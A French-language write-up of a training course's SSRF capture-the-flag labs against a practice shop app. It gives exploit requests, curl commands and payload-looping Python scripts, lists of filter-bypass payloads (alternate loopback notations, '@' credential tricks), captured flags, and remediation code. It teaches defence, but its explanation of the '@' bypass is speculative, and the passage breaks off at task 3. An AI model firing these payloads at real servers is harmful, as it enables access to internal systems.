# Server-Side Request Forgery (SSRF) - Project 0x08

## Description

Ce projet explore les vulnérabilités **Server-Side Request Forgery (SSRF)**, une faille de sécurité critique qui permet à un attaquant de forcer un serveur à effectuer des requêtes HTTP vers des destinations non prévues, notamment des ressources internes.

**Application cible** : ShopAdmin (`http://web0x08.hbtn/`)

---

## Objectifs d'apprentissage

À la fin de ce projet, vous devez être capable d'expliquer :

- Qu'est-ce que la SSRF ?
- Comment fonctionne une attaque SSRF ?
- Quels sont les types d'attaques SSRF ?
- Quel est l'impact des attaques SSRF ?
- Quels sont les risques de la SSRF ?
- Quels sont les scénarios d'attaque courants ?
- Comment se protéger contre les attaques SSRF ?
- Comment prévenir les attaques SSRF ?

---

## Ressources

- [ressources.md](ressources.md) - Guide complet sur la SSRF (définitions, exploitation, protection)
- OWASP SSRF : https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- PortSwigger Web Security Academy : https://portswigger.net/web-security/ssrf

---

## Tâches

### 0. Unlocking security, one exploit at a time!

**Objectif** : Exploiter une vulnérabilité SSRF pour accéder au dashboard admin interne.

#### Contexte

L'application ShopAdmin possède une fonctionnalité "check reduction" qui permet de vérifier les réductions d'articles via une API externe. Le paramètre `articleApi` est vulnérable à la SSRF car il n'effectue aucune validation sur l'URL fournie.

#### Informations clés

- **Application** : ShopAdmin sur `http://web0x08.hbtn/`
- **Endpoint vulnérable** : `POST /check-reduction`
- **Paramètre vulnérable** : `articleApi`
- **Port de l'application interne** : 3000
- **Cible** : Dashboard admin accessible uniquement sur `localhost:3000`

#### Méthodologie d'exploitation

##### 1. Reconnaissance

Naviguer sur l'application ShopAdmin :
- Explorer les articles disponibles
- Identifier la fonctionnalité "check reduction"

##### 2. Interception avec Burp Suite

Capturer la requête POST lors de l'utilisation de la fonctionnalité :

```http
POST /check-reduction HTTP/1.1
Host: web0x08.hbtn
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

articleApi=http%3A%2F%2Finternal-api.shop.com%3A3000%2Fcheck-reduction
```

**URL décodée** : `http://internal-api.shop.com:3000/check-reduction`

##### 3. Exploitation SSRF

Modifier le paramètre `articleApi` pour cibler `localhost:3000` et accéder au dashboard admin :

**Requête d'exploitation** :
```http
POST /check-reduction HTTP/1.1
Host: web0x08.hbtn
Content-Type: application/x-www-form-urlencoded

articleApi=http://localhost:3000/admin
```

**Réponse** : Page HTML du dashboard admin avec navigation vers :
- `/admin/dashboard` - Vue d'ensemble
- `/admin/list-of-items` - Liste des articles

##### 4. Extraction du flag

Cibler l'endpoint `/admin/list-of-items` :

```http
POST /check-reduction HTTP/1.1
Host: web0x08.hbtn
Content-Type: application/x-www-form-urlencoded

articleApi=http://localhost:3000/admin/list-of-items
```

**Réponse** : Table HTML contenant :

| ID | Name | Description | Price |
|----|------|-------------|-------|
| 1 | FLAG_0 | `f54d2e8fdb5778b21df17c83c98b31bd` | 500 |

**Flag récupéré** : `f54d2e8fdb5778b21df17c83c98b31bd`

#### Script d'exploitation automatique

```python
#!/usr/bin/env python3
import requests

url = "http://web0x08.hbtn/check-reduction"

payloads = [
    "http://localhost:3000/admin",
    "http://localhost:3000/admin/list-of-items",
    "http://127.0.0.1:3000/admin",
    "http://127.0.0.1:3000/admin/list-of-items",
]

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
}

for payload in payloads:
    print(f"[*] Testing: {payload}")
    data = {"articleApi": payload}
    response = requests.post(url, data=data, headers=headers, timeout=10)

    if "FLAG_0" in response.text:
        print(f"[!] FLAG FOUND!")
        print(response.text)
        break
```

#### Commandes curl

```bash
# Accès au dashboard admin
curl -X POST "http://web0x08.hbtn/check-reduction" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "articleApi=http://localhost:3000/admin"

# Extraction du flag depuis list-of-items
curl -X POST "http://web0x08.hbtn/check-reduction" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "articleApi=http://localhost:3000/admin/list-of-items"
```

#### Analyse de la vulnérabilité

**Type de vulnérabilité** : SSRF Classique (Regular SSRF)

**Cause première** :
- Aucune validation du paramètre `articleApi`
- Aucune restriction sur les destinations autorisées (pas de liste blanche)
- Le serveur effectue aveuglément la requête HTTP vers l'URL fournie

**Impact** :
- ✅ Contournement du contrôle d'accès (accès au dashboard admin)
- ✅ Accès à des ressources internes non exposées publiquement
- ✅ Exfiltration de données sensibles (flag, informations d'articles)

**Exploitation** :
```
Attaquant → web0x08.hbtn/check-reduction (paramètre articleApi)
              ↓
         Serveur vulnérable effectue la requête
              ↓
         localhost:3000/admin/list-of-items
              ↓
         Réponse contenant le flag retournée à l'attaquant
```

#### Remédiation

**Protection recommandée** :

1. **Liste blanche stricte** :
```python
ALLOWED_DOMAINS = ['internal-api.shop.com']

def is_allowed_url(url):
    parsed = urlparse(url)
    return parsed.hostname in ALLOWED_DOMAINS and parsed.scheme in ['http', 'https']
```

2. **Bloquer les adresses privées** :
```python
import ipaddress

def is_private_ip(hostname):
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback
    except:
        # Résoudre le hostname vers IP
        resolved_ip = socket.gethostbyname(hostname)
        return is_private_ip(resolved_ip)
```

3. **Désactiver les redirections HTTP** :
```python
response = requests.get(url, allow_redirects=False, timeout=5)
```

4. **Filtrer les réponses** :
```python
# Ne jamais retourner la réponse brute
def fetch_article_api(url):
    if not is_allowed_url(url):
        raise ValueError("URL non autorisée")

    response = requests.get(url, allow_redirects=False, timeout=5)
    data = response.json()

    # Retourner uniquement les champs attendus
    return {
        'discount': data.get('discount'),
        'valid': data.get('valid')
    }
```

**Fichier** : [0-flag.txt](0-flag.txt)

---

### 1. Is our security a fortress or a sieve? Let's SSRF and find out!

**Objectif** : Contourner un filtre de sécurité basé sur liste noire pour exploiter une vulnérabilité SSRF.

#### Contexte

Suite à un pentest, des mesures de sécurité ont été mises en place sur l'application ShopAdmin (version 2). Un filtre bloque désormais les requêtes vers `localhost` et `127.0.0.1`. Cependant, ce filtre utilise une **liste noire** (deny list), ce qui le rend vulnérable aux techniques de contournement.

#### Informations clés

- **Application** : ShopAdmin v2 sur `http://web0x08.hbtn/app2/`
- **Endpoint vulnérable** : `POST /app2/check-reduction`
- **Paramètre vulnérable** : `articleApi`
- **Port de l'application interne** : 3001 (changé de 3000)
- **Protection ajoutée** : Filtre bloquant `localhost` et `127.0.0.1`
- **Technique de bypass** : Notation décimale de l'adresse IP

#### Méthodologie d'exploitation

##### 1. Identification du filtre

Tester les payloads classiques pour comprendre le filtre :

```http
POST /app2/check-reduction HTTP/1.1
Host: web0x08.hbtn
Content-Type: application/x-www-form-urlencoded

# Test 1 : localhost (bloqué)
articleApi=http://localhost:3001/admin

# Test 2 : 127.0.0.1 (bloqué)
articleApi=http://127.0.0.1:3001/admin
```

**Résultat attendu** : Erreur ou message indiquant que l'URL est bloquée.

##### 2. Bypass avec notation décimale

**Conversion de `127.0.0.1` en notation décimale** :

```python
# Formule : (A × 256³) + (B × 256²) + (C × 256) + D
# Pour 127.0.0.1 :
decimal = (127 × 256³) + (0 × 256²) + (0 × 256) + 1
decimal = (127 × 16777216) + 0 + 0 + 1
decimal = 2130706432 + 1
decimal = 2130706433
```

**Donc : `127.0.0.1` = `2130706433`**

##### 3. Exploitation du bypass

**Requête d'exploitation** :
```http
POST /app2/check-reduction HTTP/1.1
Host: web0x08.hbtn
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

articleApi=http://2130706433:3001/admin/list-of-items
```

**Réponse** : Page HTML du dashboard admin avec la table contenant le flag.

##### 4. Extraction du flag

**Réponse obtenue** :

```html
<table class="table table-striped">
  <thead>
    <tr>
      <th>ID</th>
      <th>Name</th>
      <th>Description</th>
      <th>Price</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>FLAG_1</td>
      <td>0dcc403db7ae4137ea82bdaf7dd7d396</td>
      <td>500</td>
    </tr>
  </tbody>
</table>
```

**Flag récupéré** : `0dcc403db7ae4137ea82bdaf7dd7d396`

#### Autres techniques de bypass possibles

Outre la notation décimale, voici d'autres représentations alternatives de `127.0.0.1` :

```bash
# 1. Notation hexadécimale
http://0x7f000001:3001/admin/list-of-items

# 2. Notation octale
http://017700000001:3001/admin/list-of-items

# 3. Notation mixte (hex + decimal)
http://0x7f.0.0.1:3001/admin/list-of-items

# 4. Notation raccourcie
http://127.1:3001/admin/list-of-items
http://0:3001/admin/list-of-items

# 5. IPv6 localhost
http://[::1]:3001/admin/list-of-items
http://[0:0:0:0:0:ffff:7f00:1]:3001/admin/list-of-items
```

#### Script d'exploitation automatique

```python
#!/usr/bin/env python3
import requests
import re

url = "http://web0x08.hbtn/app2/check-reduction"

# Différentes représentations de 127.0.0.1
payloads = [
    "http://2130706433:3001/admin/list-of-items",  # Décimal (recommandé)
    "http://0x7f000001:3001/admin/list-of-items",  # Hexadécimal
    "http://017700000001:3001/admin/list-of-items",  # Octal
    "http://127.1:3001/admin/list-of-items",  # Raccourci
    "http://0:3001/admin/list-of-items",  # Zero
    "http://[::1]:3001/admin/list-of-items",  # IPv6
]

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Referer": "http://web0x08.hbtn/app2/product",
    "Origin": "http://web0x08.hbtn",
}

for payload in payloads:
    print(f"[*] Testing: {payload}")
    data = {"articleApi": payload}

    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)

        if "FLAG_1" in response.text:
            print(f"[!] FLAG FOUND with payload: {payload}")

            # Extraire le flag
            flag_match = re.search(r'<td>([a-f0-9]{32})</td>', response.text)
            if flag_match:
                flag = flag_match.group(1)
                print(f"[+] Flag: {flag}")

                with open("1-flag.txt", "w") as f:
                    f.write(flag + "\n")
                print(f"[+] Flag saved to 1-flag.txt")
            break

    except Exception as e:
        print(f"[-] Error: {e}")

print("[*] Scan completed!")
```

#### Calculateur de notation décimale

Utile pour convertir n'importe quelle adresse IP :

```python
#!/usr/bin/env python3

def ip_to_decimal(ip):
    """Convertir une adresse IP (A.B.C.D) en notation décimale"""
    parts = [int(x) for x in ip.split('.')]
    decimal = (parts[0] * 256**3 +
               parts[1] * 256**2 +
               parts[2] * 256 +
               parts[3])
    return decimal

# Exemples
print(f"127.0.0.1 = {ip_to_decimal('127.0.0.1')}")  # 2130706433
print(f"192.168.1.1 = {ip_to_decimal('192.168.1.1')}")  # 3232235777
print(f"10.0.0.1 = {ip_to_decimal('10.0.0.1')}")  # 167772161

# Conversion inverse
def decimal_to_ip(decimal):
    """Convertir une notation décimale en adresse IP"""
    parts = []
    for i in range(4):
        parts.insert(0, decimal % 256)
        decimal //= 256
    return '.'.join(map(str, parts))

print(f"2130706433 = {decimal_to_ip(2130706433)}")  # 127.0.0.1
```

#### Commandes curl

```bash
# Test avec notation décimale
curl -X POST "http://web0x08.hbtn/app2/check-reduction" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "articleApi=http://2130706433:3001/admin/list-of-items"

# Sauvegarder la réponse
curl -X POST "http://web0x08.hbtn/app2/check-reduction" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "articleApi=http://2130706433:3001/admin/list-of-items" \
  -o response.html

# Extraire le flag
grep -oP '<td>[a-f0-9]{32}</td>' response.html | grep -oP '[a-f0-9]{32}'
```

#### Analyse de la vulnérabilité

**Type de vulnérabilité** : Bypass de filtre de sécurité (SSRF avec protection insuffisante)

**Filtre implémenté (vulnérable)** :
```python
# ❌ APPROCHE PAR LISTE NOIRE (INEFFICACE)
BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0']

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.hostname in BLOCKED_HOSTS:
        return False  # Bloqué
    return True  # Autorisé

# Problème : 2130706433 n'est pas dans la liste !
# parsed.hostname = "2130706433" → Pas bloqué ✅ (pour l'attaquant)
```

**Pourquoi la liste noire échoue** :

1. **Multiples représentations** : Une adresse IP peut être représentée de plusieurs façons :
   - Décimale : `2130706433`
   - Hexadécimale : `0x7f000001`
   - Octale : `017700000001`
   - IPv6 : `[::1]`
   - Notation raccourcie : `127.1`, `0`

2. **Impossibilité de tout bloquer** : Il faudrait bloquer toutes les variantes possibles, ce qui est impraticable.

3. **DNS et résolution** : Des services comme `localtest.me` ou `nip.io` résolvent vers `127.0.0.1`.

**Impact** :
- ✅ Bypass complet du filtre de sécurité
- ✅ Accès au dashboard admin interne (port 3001)
- ✅ Exfiltration du flag (données sensibles)
- ⚠️ La "protection" n'offre aucune sécurité réelle

**Chaîne d'exploitation** :
```
Attaquant → web0x08.hbtn/app2/check-reduction
              ↓
         Filtre vérifie hostname = "2130706433"
              ↓
         Pas dans la liste noire → AUTORISÉ ✅
              ↓
         Serveur effectue la requête
              ↓
         2130706433:3001 → résolu par l'OS comme 127.0.0.1:3001
              ↓
         Accès à localhost:3001/admin/list-of-items
              ↓
         Réponse contenant FLAG_1 retournée à l'attaquant
```

#### Remédiation correcte

**❌ MAUVAIS : Liste noire**
```python
BLOCKED = ['localhost', '127.0.0.1']
if hostname not in BLOCKED:
    # Facilement contournable !
```

**✅ BON : Liste blanche + validation IP**
```python
import ipaddress
import socket

ALLOWED_DOMAINS = ['internal-api.shop.com', 'api.partner.com']

def is_safe_url(url):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # 1. Vérifier que le domaine est dans la liste blanche
    if hostname not in ALLOWED_DOMAINS:
        return False

    # 2. Résoudre l'IP et vérifier qu'elle n'est pas privée
    try:
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)

        # Bloquer les IP privées/loopback/link-local
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            return False

    except Exception:
        return False

    # 3. Vérifier le schéma et le port
    if parsed.scheme not in ['http', 'https']:
        return False

    if parsed.port and parsed.port not in [80, 443]:
        return False

    return True
```

**Protection supplémentaire** :
```python
# Désactiver les redirections
response = requests.get(url, allow_redirects=False, timeout=5)

# Filtrer la réponse
def fetch_article_api(url):
    if not is_safe_url(url):
        raise ValueError("URL non autorisée")

    response = requests.get(url, allow_redirects=False, timeout=5)
    data = response.json()

    # Ne retourner que les champs attendus
    return {
        'discount': data.get('discount', 0),
        'valid': data.get('valid', False)
    }
```

**Leçon clé** : **Toujours utiliser une liste blanche (allow list), jamais une liste noire (deny list)** pour la validation d'URL en contexte SSRF.

**Fichier** : [1-flag.txt](1-flag.txt)

---

### 2. When allowlists meet @ signs: a match made in bypass heaven

**Objectif** : Contourner un filtre de sécurité basé sur liste blanche (allowlist) pour exploiter une vulnérabilité SSRF.

#### Contexte

Après plusieurs pentests révélant des vulnérabilités SSRF, l'équipe de développement a implémenté une **liste blanche stricte** (allowlist) sur l'application ShopAdmin v3. Seuls les domaines autorisés (comme `discount.newshop.tn`) peuvent être utilisés dans les requêtes. Cette approche est considérée comme plus sécurisée que la liste noire, mais reste-t-elle vraiment inviolable ?

#### Informations clés

- **Application** : ShopAdmin v3 sur `http://web0x08.hbtn/app3/`
- **Endpoint vulnérable** : `POST /app3/check-reduction`
- **Paramètre vulnérable** : `articleApi`
- **Port de l'application interne** : 3002
- **Protection ajoutée** : Filtre de type **allowlist** autorisant uniquement `discount.newshop.tn`
- **Technique de bypass** : URL credentials avec caractère `@`

#### Méthodologie d'exploitation

##### 1. Identification du filtre allowlist

Contrairement aux tâches précédentes, cette application utilise une **liste blanche** :

```http
POST /app3/check-reduction HTTP/1.1
Host: web0x08.hbtn
Content-Type: application/x-www-form-urlencoded

# Test 1 : localhost (bloqué)
articleApi=http://localhost:3002/admin/list-of-items

# Test 2 : 127.0.0.1 (bloqué)
articleApi=http://127.0.0.1:3002/admin/list-of-items

# Test 3 : Notation décimale (bloqué)
articleApi=http://2130706433:3002/admin/list-of-items

# Test 4 : Domain autorisé (autorisé)
articleApi=http://discount.newshop.tn:3002/app3/check-reduction
```

**Résultat** :
- Toutes les représentations de localhost → **400 Bad Request** ou **403 Forbidden**
- Seul `discount.newshop.tn` passe le filtre → **200 OK**

Le filtre semble robuste car il :
1. Bloque toutes les variantes d'IP (décimale, hexa, octale, raccourcie)
2. Vérifie que le hostname est exactement `discount.newshop.tn`
3. N'est plus contournable par les techniques classiques

##### 2. Analyse du comportement du filtre

**Tests exploratoires** :

```bash
# Notation raccourcie → 403 Forbidden (détecté mais différent de 400)
articleApi=http://127.1:3002/admin/list-of-items
articleApi=http://0:3002/admin/list-of-items

# DNS rebinding → 400 Bad Request (bloqué)
articleApi=http://127.0.0.1.nip.io:3002/admin/list-of-items
articleApi=http://localtest.me:3002/admin/list-of-items

# IPv6 → 400 Bad Request (bloqué)
articleApi=http://[::1]:3002/admin/list-of-items
```

**Observation clé** : Le code **403** sur la notation raccourcie suggère que le filtre a deux niveaux :
1. **Validation du format** (400 si format invalide)
2. **Vérification de l'allowlist** (403 si format valide mais host non autorisé)

##### 3. Bypass avec URL credentials (`@`)

**Principe** : Le caractère `@` dans une URL sert normalement à inclure des credentials :

```
http://username:password@hostname:port/path
```

Si on n'inclut que le username sans password :

```
http://username@hostname:port/path
```

**Le comportement ambigu des parsers d'URL** :

Différentes librairies peuvent interpréter cette URL différemment :

```python
# Parser Python (urlparse)
from urllib.parse import urlparse
url = "http://localhost@discount.newshop.tn:3002/admin/list-of-items"
parsed = urlparse(url)

print(parsed.hostname)  # discount.newshop.tn ✅ (ce que le filtre voit)
print(parsed.username)  # localhost
```

**Mais certains clients HTTP peuvent interpréter autrement** ou faire une résolution DNS particulière selon l'implémentation.

##### 4. Exploitation du bypass

**Payload gagnant** :

```http
POST /app3/check-reduction HTTP/1.1
Host: web0x08.hbtn
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

articleApi=http://localhost@discount.newshop.tn:3002/admin/list-of-items
```

**Chaîne d'exploitation** :

```
1. Le filtre côté serveur parse l'URL :
   parsed.hostname = "discount.newshop.tn"  ✅ Dans l'allowlist !
   parsed.username = "localhost"

2. Le filtre valide la requête car hostname = "discount.newshop.tn"

3. Le serveur effectue la requête HTTP avec la librairie cliente
   Selon l'implémentation, deux scénarios possibles :

   Scénario A (configuration DNS ou reverse proxy) :
   - discount.newshop.tn:3002 est configuré pour rediriger vers localhost:3002
   - La requête atteint localhost:3002/admin/list-of-items

   Scénario B (parsing différent) :
   - Le client HTTP interprète "localhost" comme destination réelle
   - Ignore ou traite différemment la partie après @

4. Accès au dashboard admin interne sur localhost:3002

5. Réponse HTML contenant FLAG_2 retournée à l'attaquant
```

##### 5. Extraction du flag

**Réponse obtenue** :

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Admin Items</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" />
  </head>
  <body>
    <header>
      <h1>Admin Items</h1>
      <nav>
        <ul>
          <li><a href="/app3/admin/dashboard">Dashboard</a></li>
          <li><a href="/app3/admin/list-of-items">Items</a></li>
        </ul>
      </nav>
    </header>
    <div class="container mt-5">
      <table class="table table-striped">
        <thead>
          <tr>
            <th>ID</th>
            <th>Name</th>
            <th>Description</th>
            <th>Price</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>1</td>
            <td>FLAG_2</td>
            <td>2b3ef70b9a12921c159d8c22af73a25a</td>
            <td>500</td>
          </tr>
        </tbody>
      </table>
    </div>
  </body>
</html>
```

**Flag récupéré** : `2b3ef70b9a12921c159d8c22af73a25a`

#### Autres techniques de bypass avec @

Le caractère `@` offre plusieurs variantes d'exploitation :

```bash
# 1. Notation de base (celle qui fonctionne)
http://localhost@discount.newshop.tn:3002/admin/list-of-items

# 2. Avec IP décimale
http://2130706433@discount.newshop.tn:3002/admin/list-of-items

# 3. Avec notation raccourcie
http://127.1@discount.newshop.tn:3002/admin/list-of-items

# 4. Avec IPv6
http://[::1]@discount.newshop.tn:3002/admin/list-of-items

# 5. Avec faux credentials et port
http://discount.newshop.tn:80@127.0.0.1:3002/admin/list-of-items

# 6. Avec 0 (représentation minimale)
http://0@discount.newshop.tn:3002/admin/list-of-items
```

#### Script d'exploitation automatique

```python
#!/usr/bin/env python3
import requests
import re

url = "http://web0x08.hbtn/app3/check-reduction"

# Différentes variantes avec @ pour bypass allowlist
payloads = [
    "http://localhost@discount.newshop.tn:3002/admin/list-of-items",
    "http://127.0.0.1@discount.newshop.tn:3002/admin/list-of-items",
    "http://127.1@discount.newshop.tn:3002/admin/list-of-items",
    "http://0@discount.newshop.tn:3002/admin/list-of-items",
    "http://2130706433@discount.newshop.tn:3002/admin/list-of-items",
    "http://[::1]@discount.newshop.tn:3002/admin/list-of-items",
]

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Referer": "http://web0x08.hbtn/app3/product",
    "Origin": "http://web0x08.hbtn",
}

for payload in payloads:
    print(f"[*] Testing: {payload}")
    data = {"articleApi": payload}

    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"    Status: {response.status_code}")

        if "FLAG_2" in response.text:
            print(f"[!] FLAG FOUND with payload: {payload}")

            # Extraire le flag
            flag_match = re.search(r'<td>([a-f0-9]{32})</td>', response.text)
            if flag_match:
                flag = flag_match.group(1)
                print(f"[+] Flag: {flag}")

                with open("2-flag.txt", "w") as f:
                    f.write(flag + "\n")
                print(f"[+] Flag saved to 2-flag.txt")
            break

    except Exception as e:
        print(f"[-] Error: {e}")

print("[*] Scan completed!")
```

#### Commande curl

```bash
# Exploitation directe
curl -X POST "http://web0x08.hbtn/app3/check-reduction" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://web0x08.hbtn/app3/product" \
  -H "Origin: http://web0x08.hbtn" \
  -d "articleApi=http://localhost@discount.newshop.tn:3002/admin/list-of-items"

# Sauvegarder la réponse
curl -X POST "http://web0x08.hbtn/app3/check-reduction" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "articleApi=http://localhost@discount.newshop.tn:3002/admin/list-of-items" \
  -o response.html

# Extraire le flag
grep -oP '<td>FLAG_2</td>\s*<td>\K[a-f0-9]{32}' response.html
```

#### Analyse de la vulnérabilité

**Type de vulnérabilité** : SSRF avec bypass d'allowlist par ambiguïté de parsing d'URL

**Filtre implémenté (vulnérable)** :

```python
# ❌ APPROCHE ALLOWLIST SIMPLE (INSUFFISANTE)
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['discount.newshop.tn']

def is_safe_url(url):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # Vérifier que le hostname est dans l'allowlist
    if hostname not in ALLOWED_DOMAINS:
        return False  # Bloqué

    return True  # Autorisé

# Test du filtre avec le payload malveillant
url = "http://localhost@discount.newshop.tn:3002/admin/list-of-items"
parsed = urlparse(url)

print(f"hostname: {parsed.hostname}")  # discount.newshop.tn ✅
print(f"username: {parsed.username}")  # localhost ⚠️

# Le filtre voit hostname = "discount.newshop.tn" → AUTORISÉ ✅
# Mais le client HTTP peut se connecter à localhost !
```

**Pourquoi l'allowlist échoue ici** :

1. **Parsing inconsistant entre validation et exécution** :
   - Le filtre utilise `urlparse()` qui extrait `hostname = discount.newshop.tn`
   - Le client HTTP (requests, curl, etc.) peut interpréter différemment selon :
     - La configuration DNS (si discount.newshop.tn résout vers 127.0.0.1)
     - Le comportement du reverse proxy
     - Les règles de routage interne

2. **Caractère @ comme vecteur d'ambiguïté** :
   - Prévu pour les credentials HTTP (username:password@host)
   - Crée une confusion dans le parsing
   - Différentes librairies = différentes interprétations

3. **Configuration infrastructure** :
   - Si `discount.newshop.tn:3002` est configuré comme reverse proxy vers localhost
   - Ou si DNS interne résout vers 127.0.0.1
   - Le payload fonctionne "légitimement" du point de vue réseau

**Impact** :

- ✅ Bypass complet de l'allowlist pourtant considérée comme sécurisée
- ✅ Accès au dashboard admin interne (port 3002)
- ✅ Exfiltration du flag (données sensibles)
- ⚠️ Une allowlist mal implémentée n'offre qu'une fausse sécurité

**Chaîne d'exploitation détaillée** :

```
Attaquant
   ↓
Envoie: articleApi=http://localhost@discount.newshop.tn:3002/admin/list-of-items
   ↓
Serveur web0x08.hbtn/app3/check-reduction
   ↓
Filtre de sécurité (Python urlparse)
   ├─ Parse l'URL
   ├─ hostname = "discount.newshop.tn" ✅
   ├─ username = "localhost" (ignoré par le filtre)
   └─ hostname in ALLOWED_DOMAINS → AUTORISÉ ✅
   ↓
Backend effectue la requête HTTP
   ├─ Selon config DNS/proxy:
   │  ├─ Cas A: discount.newshop.tn:3002 → reverse proxy → localhost:3002
   │  ├─ Cas B: DNS interne résout vers 127.0.0.1:3002
   │  └─ Cas C: Parser HTTP interprète localhost comme destination
   └─ Connexion établie vers localhost:3002
   ↓
Application interne sur localhost:3002
   ├─ Reçoit GET /admin/list-of-items
   ├─ Pas d'authentification (accès interne supposé sûr)
   └─ Retourne le dashboard admin avec FLAG_2
   ↓
Réponse HTML traverse le chemin inverse
   ↓
Attaquant reçoit le flag: 2b3ef70b9a12921c159d8c22af73a25a
```

#### Remédiation correcte

**❌ MAUVAIS : Allowlist simple sur hostname uniquement**

```python
# Vulnérable au bypass avec @
def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False
    return True
```

**✅ BON : Validation complète avec détection de credentials**

```python
import ipaddress
import socket
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['discount.newshop.tn']

def is_safe_url(url):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # 1. Rejeter les URLs avec credentials (username/password)
    if parsed.username or parsed.password:
        return False  # Bloque http://localhost@allowed.com

    # 2. Vérifier que le hostname est dans l'allowlist
    if hostname not in ALLOWED_DOMAINS:
        return False

    # 3. Résoudre le DNS et vérifier que l'IP n'est pas privée
    try:
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)

        # Bloquer loopback, privé, link-local, multicast
        if (ip_obj.is_private or
            ip_obj.is_loopback or
            ip_obj.is_link_local or
            ip_obj.is_multicast):
            return False

    except Exception:
        return False

    # 4. Vérifier le schéma et le port
    if parsed.scheme not in ['http', 'https']:
        return False

    # 5. Restreindre les ports autorisés
    if parsed.port and parsed.port not in [80, 443]:
        return False

    return True

# Test avec payload malveillant
url = "http://localhost@discount.newshop.tn:3002/admin/list-of-items"
print(is_safe_url(url))  # False ✅ (credentials détectés)
```

**Protection supplémentaire : Normalisation d'URL**

```python
def normalize_and_validate(url):
    """Normalise l'URL avant validation pour éviter les bypasses"""
    parsed = urlparse(url)

    # Rejeter si credentials présents
    if '@' in url.split('://')[1].split('/')[0]:
        raise ValueError("URL with credentials not allowed")

    # Reconstruire l'URL sans ambiguïté
    clean_url = f"{parsed.scheme}://{parsed.hostname}"

    if parsed.port:
        clean_url += f":{parsed.port}"

    if parsed.path:
        clean_url += parsed.path

    # Valider l'URL normalisée
    return is_safe_url(clean_url)
```

**Protection au niveau infrastructure**

```python
# 1. Utiliser un proxy sortant dédié
import requests

PROXY_URL = "http://secure-proxy:8080"

def fetch_url(url):
    if not is_safe_url(url):
        raise ValueError("URL not allowed")

    # Forcer toutes les requêtes via un proxy contrôlé
    proxies = {
        'http': PROXY_URL,
        'https': PROXY_URL
    }

    response = requests.get(
        url,
        proxies=proxies,
        allow_redirects=False,  # Désactiver redirections
        timeout=5
    )

    return response

# 2. Firewall/Network Policy
# Bloquer au niveau réseau les connexions du serveur web vers :
# - 127.0.0.0/8 (loopback)
# - 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (privé)
# - 169.254.0.0/16 (link-local)
```

**Configuration Nginx pour bloquer les proxies internes**

```nginx
# Empêcher les requêtes vers localhost depuis le backend
location / {
    # Bloquer les headers suspects
    if ($http_host ~* "localhost|127\.0\.0\.1") {
        return 403;
    }

    proxy_pass http://backend;

    # Ne pas suivre les redirections
    proxy_redirect off;

    # Timeout court
    proxy_connect_timeout 5s;
    proxy_read_timeout 5s;
}
```

**Leçons clés** :

1. **Une allowlist seule ne suffit pas** - Il faut valider TOUS les composants de l'URL
2. **Détecter les credentials dans les URLs** - Le caractère `@` est un red flag
3. **Résoudre le DNS et valider l'IP** - L'hostname autorisé ne doit pas résoudre vers une IP privée
4. **Normaliser avant de valider** - Reconstruire l'URL pour éliminer les ambiguïtés
5. **Defense in depth** - Combiner validation applicative + contrôles réseau

**Fichier** : [2-flag.txt](2-flag.txt)

---

### 3. New security layers in town! Let's break 'em in and see if they hold up!

**Objectif** : Exploiter une vulnérabilité SSRF en contournant plusieurs couches de sécurité via une nouvelle fonctionnalité de redirection.

#### Contexte

L'application ShopAdmin v4 a subi plusieurs pentests révélant des failles SSRF critiques. L'équipe de développement a implémenté de **nouvelles couches de sécurité** censées bloquer toutes les tentatives d'exploitation. Mais une nouvelle fonctionnalité de navigation entre produits a été ajoutée... Peut-elle devenir le talon d'Achille de cette forteresse apparemment sécurisée ?

#### Informations clés

- **Application** : ShopAdmin v4 sur `http://web0x08.hbtn/app4-1/`
- **Endpoint vulnérable** : `POST /app4-1/check-discount`
- **Paramètre vulnérable** : `articleApi`
- **Port de l'application interne** : 8080 (backend forwarded)
- **Nouvelle fonctionnalité** : Navigation entre produits (`/product/nextProduct`)
- **Protection ajoutée** : Multiples couches de filtrage (allowlist, validation IP, blocage credentials)
- **Technique de bypass** : Chaînage de redirection via la nouvelle feature

#### Méthodologie d'exploitation

##### 1. Reconnaissance de l'application

Exploration initiale :
- Login sur ShopAdmin v4
- Navigation dans les articles disponibles
- Identification de la fonctionnalité "Check Discount"
